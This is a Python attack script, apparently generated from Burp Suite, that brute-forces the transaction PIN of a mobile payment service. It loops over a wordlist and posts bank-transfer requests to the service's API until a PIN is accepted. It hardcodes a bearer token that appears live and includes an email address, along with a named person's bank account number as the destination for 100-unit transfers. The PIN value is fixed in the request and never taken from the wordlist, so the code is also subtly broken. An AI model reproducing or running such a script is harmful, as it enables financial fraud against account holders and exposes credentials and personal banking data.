

import os
import requests
import json,time
import multiprocessing as mp

if os.path.isfile("found.txt"):
    os.remove("found.txt")
if os.path.isfile("error.txt"):
    os.remove("error.txt")

def mainProg(m,n,p):
    burp0_url = "https://transaction.dotpay.africa:443/v1/transaction/transfer/to/bank"
    burp0_headers = {"Appversion": "1.3.8", "Serialnumber": "mobile-app", "Authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIuc295ZWRva3VuMTFAZ21haWwuY29tIiwidXNlcklkIjoiRE9UMDMzNzcxNzMyIiwibWVyY2hhbnRJZCI6IjA0MTIzNDU2NzgiLCJlbWFpbCI6Ii5zb3llZG9rdW4xMUBnbWFpbC5jb20iLCJmdWxseUF1dGhlbnRpY2F0ZWQiOnRydWUsInJvbGUiOlsiUk9MRV9QUkVfQUdFTlQiXSwiYXV0aG9yaXRpZXMiOlsiUk9MRV9QUkVfQUdFTlQiXSwiaWF0IjoxNzAyOTU5NTUyLCJleHAiOjE3MDI5Nzc1NTJ9.ue19DRJt47EFfKJ5NW5Zn0WyzIhgOB451iBPL0pdXmbrRPPp355_olK4gTkWEBUl74MUMXZoei827eSW0OZqTg", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "okhttp/4.9.1", "Connection": "close"}


    with open("comb.txt", "r") as handle:
        lines = handle.readlines()
    i = 1
    for line in lines[m:n]:
        print(f"PROCESS==> {p}\n")
        print(f"{i}==> Trying: {line}")
        burp0_json={"agentAccountId": "DOT033771732", "amount": 100.0, "bankAccountName": "Daniel  Iyogun", "bankAccountNumber": "8144781314", "bankCode": "305", "bankName": "PAYCOM (OPAY)", "geoLocation": "", "narration": "", "paymentDate": "045011", "transactionPin": "1212", "transactionReference": "DOT033771732120231219045011"}

        #print("crafted pload")
        #try:
        response = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
        #print(response.text)
        #exit()
        x = response.json()
        if x["message"]:
            if x["message"] == "Invalid pin":
                print("Incorrect Pin!")

            else:
                print(f"PROCESS==> {p}\n")
                print(x)
                print("\n Pin Found!")
                print(line)
                with open("found.txt", "a") as handle:
                    lisnes = handle.write(line)
                exit()
        else:
            print(f"PROCESS==> {p}\n")
            print(x)
            print("\n Pin Found!")
            print(line)
            with open("found.txt", "a") as handle:
                lisnes = handle.write(line)
            exit()
        i += 1
        time.sleep(6)


if __name__ == '__main__':
    #num = input("Enter number: ")
    #num = num.strip()
    count1 = 10000
    
    p1 = mp.Process(target=mainProg, args=(0, int(count1), 1))
    """
    p2 = mp.Process(target=mainProg, args=(int(count1), int(count1*2), 2))
    p3 = mp.Process(target=mainProg, args=(int(count1*2), int(count1*3), 3))
    
    p4 = mp.Process(target=mainProg, args=(int(count1*3), int(count1*4), 4))
    p5 = mp.Process(target=mainProg, args=(int(count1*4), int(count1*5), 5))
    p6 = mp.Process(target=mainProg, args=(int(count1*5), int(count1*6), 6))
    p7 = mp.Process(target=mainProg, args=(int(count1*6), int(count1*7), 7))
    p8 = mp.Process(target=mainProg, args=(int(count1*7), int(count1*8), 8))
    p9 = mp.Process(target=mainProg, args=(int(count1*8), int(count1*9), 9))
    p10 = mp.Process(target=mainProg, args=(int(count1*9), int(count1*10), 10))
    """
    p1.start()
    """
    p2.start()
    
    p3.start()
    p4.start()
    p5.start()
    p6.start()
    p7.start()
    p8.start()
    p9.start()

    p10.start()
    """
